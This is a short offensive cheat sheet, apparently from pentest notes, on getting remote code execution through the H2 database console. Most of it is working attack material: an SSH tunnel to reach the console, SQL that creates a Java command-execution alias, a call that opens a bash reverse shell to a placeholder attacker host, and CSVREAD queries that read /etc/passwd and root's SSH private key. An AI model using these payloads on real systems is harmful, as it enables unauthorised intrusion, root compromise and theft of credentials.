# H2 Database Java ALIAS RCE

H2 console (default port 8082, often localhost-only) allows executing arbitrary Java via `CREATE ALIAS`.

**Access** (usually requires SSH tunnel if localhost-only):
```bash
ssh -L 8082:127.0.0.1:8082 <user>@<TARGET>
# browse to http://localhost:8082
```

**Create a Java exec alias and call it:**
```sql
CREATE ALIAS SHELLEXEC AS $$
  String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(
      Runtime.getRuntime().exec(cmd).getInputStream()
    ).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
  }
$$;

CALL SHELLEXEC('id');
CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"');
```

**Arbitrary file read** (simpler, no alias needed):
```sql
SELECT * FROM CSVREAD('/etc/passwd');
SELECT * FROM CSVREAD('/root/.ssh/id_rsa');
```

H2 often runs as root on Linux targets — shell lands as root directly.
